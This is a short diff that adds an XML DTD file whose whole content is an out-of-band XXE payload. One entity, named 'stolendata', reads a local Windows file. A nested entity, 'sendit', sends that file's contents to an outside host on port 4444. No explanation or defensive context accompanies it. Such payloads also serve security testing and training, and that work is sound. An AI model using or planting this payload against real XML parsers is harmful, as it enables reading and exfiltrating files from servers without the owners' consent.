@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
+<!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://www.bouncybouncy.net:4444/?%stolendata;'>">
